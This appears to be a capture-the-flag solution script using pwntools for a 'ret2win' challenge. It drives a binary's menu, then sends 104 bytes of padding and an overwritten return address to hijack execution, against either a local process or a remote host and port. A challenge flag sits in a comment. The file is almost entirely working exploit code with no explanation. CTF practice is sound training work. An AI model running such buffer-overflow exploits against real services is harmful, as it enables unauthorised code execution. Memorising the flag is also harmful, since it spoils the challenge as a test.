from pwn import *
import sys
# context.log_level = "debug"
'''
Simple ret2win
FLAG{C0n6r47ul4710n5_0n_cr4ck1n6_7h15_pr09r4m_!!_!!_!}
'''

if len(sys.argv) == 1:
    r = process("./ms")
    #gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
bd = 0x000000000040131b
padding = b'A' * 104

r.sendlineafter(b'> ',b'1')
r.sendlineafter(b': ',b'a')
r.sendlineafter(b': ',b'b')
r.sendlineafter(b': ',b'c')
r.sendlineafter(b'> ',b'3')
r.sendlineafter(b': ',padding + p64(bd))

r.interactive()